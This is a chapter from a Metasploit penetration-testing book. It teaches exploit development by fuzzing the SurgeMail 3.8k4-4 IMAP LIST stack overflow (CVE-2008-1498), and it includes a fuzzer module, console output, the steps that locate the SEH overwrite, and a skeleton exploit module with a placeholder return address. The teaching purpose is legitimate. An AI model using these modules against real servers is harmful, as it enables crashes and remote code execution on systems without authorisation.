<html><head></head><body><section epub:type="chapter" id="creating_your_own_exploits"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 14. Creating Your Own Exploits</h2></div></div></div><p class="calibre2">As a penetration tester, you will frequently encounter applications for which no Metasploit modules are available. In such situations, you can attempt to uncover vulnerabilities in the application and develop your own exploits for them.<a id="IDX-CHP-14-0001" class="strong"/><a id="IDX-CHP-14-0002" class="strong"/><a id="IDX-CHP-14-0003" class="strong"/><a id="IDX-CHP-14-0004" class="strong"/></p><p class="calibre2">One of the easiest ways to discover a vulnerability is to fuzz the application. <span class="strong"><em class="calibre4">Fuzz testing</em></span> is the act of sending invalid, unexpected, or malformed random data to an application and monitoring it for exceptions such as crashes. If a vulnerability is found, you can work to develop an exploit for it. Fuzzing is a vast topic and entire books have been written on the subject. We will only briefly scratch the surface of fuzzing prior to moving on and developing a working exploit module.</p><p class="calibre2">In this chapter we’ll walk you though the process of identifying a vulnerability via fuzzing and exploit development, using the known vulnerability in NetWin SurgeMail 3.8k4-4, discovered by Matteo Memelli (ryujin) and available at <a class="xref" href="http://www.exploit-db.com/exploits/5259/" target="_top">http://www.exploit-db.com/exploits/5259/</a>. This application had a vulnerability that made it improperly handle overly long <code class="literal">LIST</code> commands, resulting in a stack overflow that let an attacker execute code remotely.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">This chapter assumes that you are familiar with exploit development and comfortable with the concept of buffer overflows and the use of a debugger. If you need a bit of a refresher, you’ll find some excellent tutorials by <span class="strong"><em class="calibre4">corelanc0d3r</em></span> on the Exploit Database site, <a class="xref" href="http://www.exploit-db.com/" target="_top">http://www.exploit-db.com/</a>. At a minimum, consider reading “Exploit Writing Tutorial Part 1: Stack Based Overflows”(<a class="xref" href="http://www.exploit-db.com/download_pdf/13535/" target="_top">http://www.exploit-db.com/download_pdf/13535/</a>) and “Exploit Writing Tutorial Part 3: SEH” (<a class="xref" href="http://www.exploit-db.com/download_pdf/13537/" target="_top">http://www.exploit-db.com/download_pdf/13537/</a>).<a id="IDX-CHP-14-0005" class="strong"/><a id="IDX-CHP-14-0006" class="strong"/><a id="IDX-CHP-14-0007" class="strong"/><a id="IDX-CHP-14-0008" class="strong"/><a id="IDX-CHP-14-0009" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="the_art_of_fuzzing">The Art of Fuzzing</h2></div></div></div><p class="calibre2">Before you develop any exploit, you need to determine whether a vulnerability exists in the application. This is where fuzzing comes into play.</p><p class="calibre2">The following listing shows the code for a simple Internet Message Access Protocol (IMAP) fuzzer. Save this to your <span class="strong"><em class="calibre4">/root/.msf3/modules/auxiliary/fuzzers/</em></span> directory, but be sure to keep your testing modules in a folder separate from the main Metasploit trunk.<a id="IDX-CHP-14-0010" class="strong"/></p><a id="I_programlisting14_d1e16035" class="strong"/><pre class="programlisting">require 'msf/core'
class Metasploit3 &lt; Msf::Auxiliary
   <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>include <strong class="calibre3"><code class="calibre6">Msf::Exploit::Remote::Imap</code></strong>
   <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>include <strong class="calibre3"><code class="calibre6">Msf::Auxiliary::Dos</code></strong>
        def initialize
                super(
                        'Name'           =&gt; 'Simple IMAP Fuzzer',
                        'Description'    =&gt; %q{
                                                An example of how to
 build a simple IMAP fuzzer.
                                                Account IMAP
 credentials are required in this
                                                     fuzzer.},
                        'Author'         =&gt; [ 'ryujin' ],
                        'License'        =&gt; MSF_LICENSE,
                        'Version'        =&gt; '$Revision: 1 $'
                )
        end
        def fuzz_str()
             <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">return Rex::Text.rand_text_alphanumeric(rand(1024))</code></strong>
        end
        def run()
                srand(0)
                while (true)
                     <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>connected = connect_login()
                        if not connected
                              print_status(
<strong class="calibre3"><code class="calibre6">"Host is not responding - this is G00D ;</code></strong>)")
                                break
                        end
                        print_status("Generating fuzzed data...")
                    <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">fuzzed = fuzz_str()</code></strong>
                        print_status("Sending fuzzed data,
 buffer length = %d" % fuzzed.length)
                    <img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/>req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
                        print_status(req)
                        res = raw_send_recv(req)
                                if !res.nil?
                        print_status(res)
                                else
                                      print_status(<strong class="calibre3"><code class="calibre6">"Server crashed, no response"</code></strong>)
                                        break
                                end
                        disconnect()
                end
        end
end</pre><p class="calibre2">The fuzzer module begins by importing the IMAP <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16092" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and denial-of-service <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16098" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> mixins. Including IMAP gives you the required login functionality, and since the goal of the fuzzer is to crash the server, this module results in a denial of service.<a id="IDX-CHP-14-0011" class="strong"/><a id="IDX-CHP-14-0012" class="strong"/></p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16112" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> the <span class="strong"><em class="calibre4">fuzz string</em></span> (the malformed data we want to send) is set as a randomized string of alphanumeric characters with a maximum length of 1024 bytes. The fuzzer connects and logs into the remote service at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16121" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, and if it fails to connect and the loop breaks, you have something worth investigating. The lack of response by the server might mean that you’ve successfully caused an exception in the remote service.<a id="IDX-CHP-14-0013" class="strong"/></p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16132" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> the variable <code class="literal">fuzzed</code> is set to the random string generated by the Framework, and the malicious request <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16141" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> is built according to the published exploit code by appending the malicious data to the vulnerable <code class="literal">LIST</code> command. If the fuzzer doesn’t receive a response from the server, it prints the message <code class="literal">"Server crashed, no response"</code> and quits.</p><p class="calibre2">To test your new fuzzer, start up <span class="strong"><em class="calibre4">msfconsole</em></span>, load the module, and set its options as follows:</p><a id="I_programlisting14_d1e16158" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/fuzzers/imap_fuzz</code></strong>
msf auxiliary(imap_fuzz) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   IMAPPASS                   no        The password for the specified username
   IMAPUSER                   no        The username to authenticate as
   RHOST                      yes       The target address
   RPORT     143              yes       The target port

msf auxiliary(imap_fuzz) &gt; <strong class="calibre3"><code class="calibre6">set IMAPPASS test</code></strong>
IMAPPASS =&gt; test
msf auxiliary(imap_fuzz) &gt; <strong class="calibre3"><code class="calibre6">set IMAPUSER test</code></strong>
IMAPUSER =&gt; test
msf auxiliary(imap_fuzz) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.1.155</code></strong>
RHOST =&gt; 192.168.1.155
msf auxiliary(imap_fuzz) &gt;</pre><p class="calibre2">The fuzzer should now be ready to go. Make sure that your debugger of choice (we’re using the Immunity Debugger in our examples) is attached to the <span class="strong"><em class="calibre4">surgemail.exe</em></span> process, and start the fuzzer:<a id="IDX-CHP-14-0014" class="strong"/><a id="IDX-CHP-14-0015" class="strong"/></p><a id="I_programlisting14_d1e16186" class="strong"/><pre class="programlisting">msf auxiliary(imap_fuzz) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] Authenticating as test with password test...
  [*] Generating fuzzed data...
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> [*] Sending fuzzed data, buffer length = 684
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
 [*] 0002 LIST () "/v1AD7DnJTVykXGYYM6BmnXuYRlZNIJUzQzFPvA
SjYxzdTTOngBJ5gfK0XjLy3ciAAk1Fmo0
       RPEpq6f4BBnp5jm3LuSbAOj1M5qULEGEv0DMk0oOPUj6XPN1VwxFpjAf
FeAxykiwdDiqNwnVJAKyr6X7C5ije7
       DSujURybOp6BkKWroLCzQg2AmTuqz48oNeY9CDeirNwoITfIaC40
Ds9OgEDtL8WN5tL4QYdVuZQ85219Thogk7
       75GVfNH4YPpSo2PLmvd5Bf2sY9YDSvDqMmjW9FXrgLoUK2rl9cvoCbTZ
X1zuU1dDjnJJpXDuaysDfJKbtHn9Vh
       siiYhFokALiF1QI9BRwj4bo0kwZDn8jyedxhSRdU9CFlMs19CvbVnnL
WeRGHScrTxpduVJZygbJcrRp6AWQqke
       Y0DzI4bd7uXgTIHXN6R403ALckZgqOWcUSEWj6THI9NFAIPP1LEnctaK
0uxbzjpS1ize16r388StXBGq1we7Qa
       8j6xqJsN5GmnIN4HQ4W4PZIjGRHUZC8Q4ytXYEksxXe2ZUhl5Xbdhz13
zW2HpxJ2AT4kRU1wDqBUkEQwvKtoeb
       rfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHD
VbsDmUHTfAFbreJTHVlcIruAozmZKz
       i7XgTaOgzGh" "PWNED"

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> [*] 0002 OK LIST completed

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  [*] Authenticating as test with password test...
  [*] Generating fuzzed data...
  [*] Sending fuzzed data, buffer length = <strong class="calibre3"><code class="calibre6">1007</code></strong>
  [*] 0002 LIST () "/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXR
qbZnOMzprZfVZH7BYvcHuwlN0Yq
       yfoCrJyobzOqoscJeTeRgrDQKA8MDDLbmY6WCQ6XQH9Wkj4c9JCfPjIq
TndsocWBz1xLMX1VdsutJEtnceHvhl
       Gqee6Djh7v3oJW4tXJMMxe8uR2NgBlKoCbH18VTR8GUFqWCmQ097
0B3gR9foi6inKdWdcE6ivbOHElAiYkFYzZ
       06Q5dvza58DVhn8sqSnRAmq1UlcUGuvr6r99POlrZst10r606J2B03TBGDFuy
0dNMI0EUANKZ6OnCn3Zk1JL65
       9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6
D86mAtyg9S1a7RALrbRcLIHJpwMsEE
       5LS1wIV9aFPS6RQwI4DtF4bGSle1FCyf63hy3Vo8AKkId6yu5MfjwfUExand
VeUldk8c5bhlyqoDp3UX2ClQPZ
       os0KpFoIcxmq8R0E3Ri54l5Yl3OPcN7U20Kb1CEAfbhxGFgh1oMzjJpuM7
IbHMrZNjVADz6A0byzgiP2pXa7Zm
       OloV9u6Fwa0l6sR6oL0Png9MYNwTMXTUdiE7rOjuOmkdgglPTkZ3n4de1FE
aLh8Xhf9SNSPZUX0M7gmUiyNYv6
       qti3Omy8qvjJOQui1IhUhf5fKOunKIcB5Zw7quznxV1GF2R5hXVTw1vlbMi5
TQW68ZDFlD6q6BJ4S3oNrFCyXX
       aQpAURyCoDGdjoxk1vrUPGusf3i4EIF2iqyyekWiQ7GuYcwMax3o0ZXB2djFh2
dYEGyBSCHaFhpwUgamThinnM
       AsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4Zooquw0HPaVnbNVo97tfVBYSei9dWCUWwU
APVJVsTGoDNRVarOrg8q
       wbziv8aQaPZ7Y8r0SUiB1nNhlhl3UCVZpf8Gck0psjETf4ks356q0I
3mLZkqCLkznVV4ayetVgaDm" "PWNED"

<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> [*] Server crashed, no response
  [*] Auxiliary module execution completed
  msf auxiliary(imap_fuzz) &gt;</pre><p class="calibre2">In this listing, the fuzzer connects and logs into the remote service at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16231" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and generates a random string of text at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16237" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. At <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16243" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> the malicious request is sent to the server, and the reply is received and displayed at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16249" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>. If the server receives no reply, you receive the notification at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16255" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> that the server has crashed, which is your cue to check your debugger.</p><p class="calibre2">If you now check your debugger on the Windows target, you should see that it has paused at the point of the crash, as shown in <a class="xref" href="part0018.html#the_debugger_pauses_at_the_point_of_the">Figure 14-1</a>. Looking at the crash, we can see that no memory addresses are overwritten and that, unfortunately, there’s nothing really exploitable at first glance. After further tinkering with increasing buffer lengths, you will find that by sending an even longer string of 11,000 bytes, you can overwrite the Structured Exception Handler (SEH). Controlling the SEH makes the exploit more reliable, because it makes it more versatile. Similarly, the use of an application DLL for a return address makes the exploit portable across different operating system versions.<a id="IDX-CHP-14-0016" class="strong"/><a id="IDX-CHP-14-0017" class="strong"/><a id="IDX-CHP-14-0018" class="strong"/><a id="IDX-CHP-14-0019" class="strong"/><a id="IDX-CHP-14-0020" class="strong"/><a id="IDX-CHP-14-0021" class="strong"/><a id="IDX-CHP-14-0022" class="strong"/></p><div class="figure"><a id="the_debugger_pauses_at_the_point_of_the" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16295" class="strong"/><img src="../images/00048.jpeg" alt="The debugger pauses at the point of the crash." hisrc="httpatomoreillycomsourcenostarchimages867550.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-1. The debugger pauses at the point of the crash.</div></div><p class="calibre2">To send the 11,000-byte string, we make a small change in the fuzzer code, as shown here:</p><a id="I_programlisting14_d1e16302" class="strong"/><pre class="programlisting">print_status("Generating fuzzed data...")
 <strong class="calibre3"><code class="calibre6">fuzzed = "A" * 11000</code></strong>
  print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
  req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"</pre><p class="calibre2">Rather than using the random string of characters, this code modification sends a string of 11,000 <span class="strong"><em class="calibre4">A</em></span>s as part of the malicious request.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="controlling_the_structured_exception_han">Controlling the Structured Exception Handler</h2></div></div></div><p class="calibre2">If you restart the <span class="strong"><em class="calibre4">surgemail</em></span> service, reattach the debugger to the process, and rerun the module, you should see the crash that fuzzing found in your debugger. If you’re using the Immunity Debugger, you should be able to see the contents of the SEH chain by selecting <span class="strong"><strong class="calibre3">View</strong></span>▸<span class="strong"><strong class="calibre3">SEH chain</strong></span>. Right-click the value, which should be <span class="strong"><em class="calibre4">41414141</em></span>, and select <span class="strong"><strong class="calibre3">Follow address in stack</strong></span> to display the stack contents leading to the SEH overwrite in the lower-right pane shown in <a class="xref" href="part0018.html#the_overwritten_seh_entry">Figure 14-2</a>.</p><div class="figure"><a id="the_overwritten_seh_entry" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16338" class="strong"/><img src="../images/00049.jpeg" alt="The overwritten SEH entry" hisrc="httpatomoreillycomsourcenostarchimages867552.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-2. The overwritten SEH entry</div></div><p class="calibre2">Now that you know that you can control the SEH chain on the vulnerable <span class="strong"><em class="calibre4">surgemail</em></span> process with an overly long buffer, it’s time to determine the exact length required to overwrite it on the target. As you will recall from our discussions of stand-alone exploit development, before you can use a return address, you first need to find out where, exactly, the overwrite occurs.</p><p class="calibre2">We can modify our fuzzer code to create a nonrepeating, random string of characters of a specific length, as shown next:</p><a id="I_programlisting14_d1e16350" class="strong"/><pre class="programlisting">print_status("Generating fuzzed data...")
  fuzzed = <strong class="calibre3"><code class="calibre6">Rex::Text.pattern_create</code></strong>(11000)
  print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
  req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"</pre><p class="calibre2">In this listing, we use <code class="literal">Rex::Text.pattern_create</code> to generate the nonrepeating random string of characters with our fuzzer. Rerunning the fuzzer module now shows that SEH was overwritten on the target with <span class="strong"><em class="calibre4">684E3368</em></span>, as shown in <a class="xref" href="part0018.html#the_seh_overwritten_with_random_characte">Figure 14-3</a>.<a id="IDX-CHP-14-0023" class="strong"/></p><div class="figure"><a id="the_seh_overwritten_with_random_characte" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16371" class="strong"/><img src="../images/00050.jpeg" alt="The SEH overwritten with random characters" hisrc="httpatomoreillycomsourcenostarchimages867554.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-3. The SEH overwritten with random characters</div></div><p class="calibre2">With the SEH overwritten with our random set of characters, we can use <span class="strong"><em class="calibre4">pattern_offset.rb</em></span> in <span class="strong"><em class="calibre4">/opt/metasploit3/msf3/tools/</em></span> to determine exactly where the overwrite occurs by passing the characters of interest (<span class="strong"><em class="calibre4">684E3368</em></span>) followed by the length of the string that was sent to the target (<span class="strong"><em class="calibre4">11000</em></span>), as shown here:<a id="IDX-CHP-14-0024" class="strong"/></p><a id="I_programlisting14_d1e16393" class="strong"/><pre class="programlisting">root@bt:˜/.msf3/modules/auxiliary/fuzzers#
 <strong class="calibre3"><code class="calibre6">/opt/metasploit3/msf3/tools/pattern_offset.rb</code></strong>
      <strong class="calibre3"><code class="calibre6">684E3368 11000</code></strong>
10360</pre><p class="calibre2">The value <span class="strong"><em class="calibre4">10360</em></span> means that the four bytes that overwrite SEH are 10361, 10362, 10363, and 10364. We can now change the fuzzer code one last time to verify our findings:</p><a id="I_programlisting14_d1e16407" class="strong"/><pre class="programlisting">print_status("Generating fuzzed data...")
 fuzzed = "\x41" * <strong class="calibre3"><code class="calibre6">10360</code></strong> fuzzed &lt;&lt; "\x42" * <strong class="calibre3"><code class="calibre6">4</code></strong> fuzzed &lt;&lt; "\x43" * <strong class="calibre3"><code class="calibre6">636</code></strong>
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)</pre><p class="calibre2">As shown, the fuzzer will build the malicious request beginning with 10,360 <span class="strong"><em class="calibre4">A</em></span>s (hexadecimal <span class="strong"><em class="calibre4">41</em></span>), followed by four <span class="strong"><em class="calibre4">B</em></span>s (hexadecimal <span class="strong"><em class="calibre4">42</em></span>) to overwrite the SEH, and then 636 <span class="strong"><em class="calibre4">C</em></span>s (hexadecimal <span class="strong"><em class="calibre4">43</em></span>) as filler to keep the string length constant at 11,000 bytes.</p><p class="calibre2">Running the fuzzer against the target again shows that the entire SEH chain is under your complete control, as shown in <a class="xref" href="part0018.html#seh_fully_controlled">Figure 14-4</a>.</p><div class="figure"><a id="seh_fully_controlled" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16446" class="strong"/><img src="../images/00051.jpeg" alt="SEH fully controlled" hisrc="httpatomoreillycomsourcenostarchimages867556.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-4. SEH fully controlled</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="hopping_around_seh_restrictions">Hopping Around SEH Restrictions</h2></div></div></div><p class="calibre2">Following the SEH overwrite, there’s very little space for shellcode before the end of the stack. Normally, a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> set of instructions would be used to reach the Next SEH (NSEH), followed by a short jump forward into the shellcode. We’ll overcome this limited space restriction by developing an exploit to use as much space as possible for our final payload. At this point, we are done with the fuzzing process and we’ll move into developing an exploit for the vulnerability that we found.<a id="IDX-CHP-14-0025" class="strong"/><a id="IDX-CHP-14-0026" class="strong"/><a id="IDX-CHP-14-0027" class="strong"/><a id="IDX-CHP-14-0028" class="strong"/><a id="IDX-CHP-14-0029" class="strong"/><a id="IDX-CHP-14-0030" class="strong"/><a id="IDX-CHP-14-0031" class="strong"/><a id="IDX-CHP-14-0032" class="strong"/><a id="IDX-CHP-14-0033" class="strong"/></p><p class="calibre2">This exploit would be a good candidate for an <span class="strong"><em class="calibre4">egg hunter</em></span>, which is a small segment of shellcode that searches memory for the main payload; however, we’ll use a different tactic and overwrite SEH with the <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> instruction pointer. Once that’s overwritten we’ll make a short jump backward that requires very few instructions (rather than jumping forward). Next, we’ll use the space gained in the short jump to execute the larger near jump farther back into a NOP slide and shellcode. Although it’s not required, a NOP slide is always a good addition to an exploit, because it gives you a little room for error should the buffer position change in memory. NOPs will have no adverse impact on the exploit code and will act as filler. Conceptually, the attack will look like this:<a id="IDX-CHP-14-0034" class="strong"/></p><a id="I_programlisting14_d1e16504" class="strong"/><pre class="programlisting">[Buffer of garbage | NOP Slide | Shellcode | Near Jump | Short Jump | POP-POP-RETN]</pre><p class="calibre2">To ensure portability of the exploit across different versions of Windows, use a return address from an application DLL or executable. In this case, only the application executable itself is available, so you can try to accomplish a three-byte overwrite of SEH using a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> sequence of instructions from the <span class="strong"><em class="calibre4">surgemail.exe</em></span> file. If this can be done successfully, the exploit will be universal across versions of Windows.</p><p class="calibre2">Let’s move on to creating the actual exploit for the SurgeMail vulnerability. Following is our initial skeleton exploit module to be saved in <span class="strong"><em class="calibre4">/root/.msf3/modules/exploits/windows/imap/</em></span>:<a id="IDX-CHP-14-0035" class="strong"/></p><a id="I_programlisting14_d1e16522" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

    include Msf::Exploit::Remote::Imap

    def initialize(info = {})
        super(update_info(info,
            'Name'           =&gt; 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
            'Description'    =&gt; %q{
                This module exploits a stack overflow in the Surgemail IMAP Server
                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP
                account credentials are required.
            },
            'Author'         =&gt; [ 'ryujin' ],
            'License'        =&gt; MSF_LICENSE,
            'Version'        =&gt; '$Revision: 1 $',
            'References'     =&gt;
                [
                    [ 'BID', '28260' ],
                    [ 'CVE', '2008-1498' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
                ],
            'Privileged'     =&gt; false,
            'DefaultOptions' =&gt;
                {
                    'EXITFUNC' =&gt; 'thread',
                },
            'Payload'        =&gt;
                {
                  <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">'Space'       =&gt; 10351,</code></strong>
                    'DisableNops' =&gt; true,
                    'BadChars'    =&gt; "\x00"
                },
            'Platform'       =&gt; 'win',
            'Targets'        =&gt;
                [
                   <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>[ 'Windows Universal', { 'Ret' =&gt;
 0xDEADBEEF } ], # p/p/r TBD
                ],
            'DisclosureDate' =&gt; 'March 13 2008',
            'DefaultTarget' =&gt; 0))
    end

    def exploit
      <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>connected = connect_login
      <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>lead = "\x41" * 10360
      <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>evil = lead + "\x43" * 4
        print_status("Sending payload")
      <img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/>sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
      <img src="../images/00027.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867508.png" class="calibre7"/>sock.put(sploit)
        handler
        disconnect
    end

end</pre><p class="calibre2">The <code class="literal">'Space'</code> declaration at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16574" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> refers to the space available for shellcode. This declaration is very important in an exploit module because it determines which payloads Metasploit will allow you to use when running your exploit. Some payloads require much more space than others, so try not to overstate this value. Payload sizes vary greatly and encoding increases their sizes. To see the size of an unencoded payload, you would use the <code class="literal">info</code> command followed by the name of the payload and look for the <code class="literal">Total size</code> value, as shown here:<a id="IDX-CHP-14-0036" class="strong"/><a id="IDX-CHP-14-0037" class="strong"/><a id="IDX-CHP-14-0038" class="strong"/></p><a id="I_programlisting14_d1e16596" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">info payload/windows/shell_bind_tcp</code></strong>

       Name: Windows Command Shell, Bind TCP Inline
     Module: payload/windows/shell_bind_tcp
    Version: 8642
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 341
       Rank: Normal</pre><p class="calibre2">The return address at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16603" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> in the <code class="literal">'Targets'</code> section is currently occupied by a placeholder value, which we’ll change later in the exploit development process.<a id="IDX-CHP-14-0039" class="strong"/><a id="IDX-CHP-14-0040" class="strong"/><a id="IDX-CHP-14-0041" class="strong"/><a id="IDX-CHP-14-0042" class="strong"/><a id="IDX-CHP-14-0043" class="strong"/></p><p class="calibre2">As with the fuzzer module discussed earlier, this exploit connects and logs into the target at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16633" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, uses a string of <span class="strong"><em class="calibre4">A</em></span>s at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16642" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> as the initial buffer, and appends four <span class="strong"><em class="calibre4">C</em></span>s at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16651" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> to overwrite the SEH. The entire exploit string is generated at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16658" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> and then sent to the target at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16664" class="strong"/><img src="../images/00027.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867508.png" class="calibre8"/></span>.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="getting_a_return_address">Getting a Return Address</h2></div></div></div><p class="calibre2">The next step is to locate a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> sequence in <span class="strong"><em class="calibre4">surgemail.exe</em></span>. To do so, copy the executable to a location on your Back|Track machine, and then use the <code class="literal">-p</code> switch with <code class="literal">msfpescan</code> to locate a suitable candidate, as in the following example:</p><a id="I_programlisting14_d1e16687" class="strong"/><pre class="programlisting">root@bt:/tmp# <strong class="calibre3"><code class="calibre6">msfpescan -p surgemail.exe</code></strong>

[surgemail.exe]
0x0042e947 pop esi; pop ebp; ret
0x0042f88b pop esi; pop ebp; ret
0x00458e68 pop esi; pop ebp; ret
0x00458edb pop esi; pop ebp; ret
0x0046754d pop esi; pop ebp; ret
0x00467578 pop esi; pop ebp; ret
0x0046d204 pop eax; pop ebp; ret

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

0x0078506e pop ebx; pop ebp; ret
0x00785105 pop ecx; pop ebx; ret
